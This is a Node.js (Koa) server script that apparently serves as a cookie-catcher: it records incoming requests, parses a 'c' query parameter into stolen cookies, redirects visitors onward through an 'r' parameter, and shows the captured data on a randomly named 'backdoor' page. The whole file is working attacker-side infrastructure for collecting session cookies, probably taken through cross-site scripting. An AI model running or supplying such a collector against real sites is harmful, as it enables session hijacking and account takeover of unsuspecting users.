const fs = require('fs');
const Handlebars = require('handlebars');
const Koa = require('koa');
const logger = require('koa-logger');
const IO = require('koa-socket');
const password = require('secure-random-password');
const path = require('path');

const app = new Koa();
const io = new IO();

const backdoorTemplatePath = path.join(__dirname, 'backdoor.html');
const backdoorTemplate = Handlebars.compile(fs.readFileSync(backdoorTemplatePath, 'utf8'));

const startTime = new Date().toISOString();

app.proxy = true;

app.use(logger());

const backdoorPath = '/' + password.randomPassword({ length: 8, characters: password.lower });

let globalVars = {
  backdoorPath,
  clearUrl: backdoorPath + '/clear',
  startTime,
};

let requests = [];

app.use(async ctx => {
  if (ctx.method === 'POST' && ctx.url === backdoorPath + '/clear') {
    requests = [];
    ctx.redirect(backdoorPath);
    return;
  }

  if (ctx.url === backdoorPath) {
    let interestingRequests = requests
      .filter(x => x.path !== '/favicon.ico');
    ctx.body = backdoorTemplate({ ...globalVars, requests: interestingRequests });
    return;
  }

  let requestObj = {
    method: ctx.method,
    path: ctx.path,
  };
  if (Object.keys(ctx.query).length) {
    let query = { ...ctx.query };

    if (query.hasOwnProperty('c')) {
      let c = query.c;
      delete query.c;
      requestObj.cookies = c.split(/;\s*/);
    }

    if (query.hasOwnProperty('password')) {
      query['password'] = '********';
    }

    requestObj.query = Object.keys(query).map(key => ({
      key,
      value: query[key],
    }));
  }

  requests.push(requestObj);

  let redirect_url = ctx.request.query.r;
  if (redirect_url) {
    ctx.redirect(redirect_url);
    return;
  }

  ctx.body = '';
});

io.attach(app);

const port = 80;
console.log(`Serving at http://localhost:${port}/`);
console.log('Backdoor at: ' + backdoorPath);
app.listen(port);
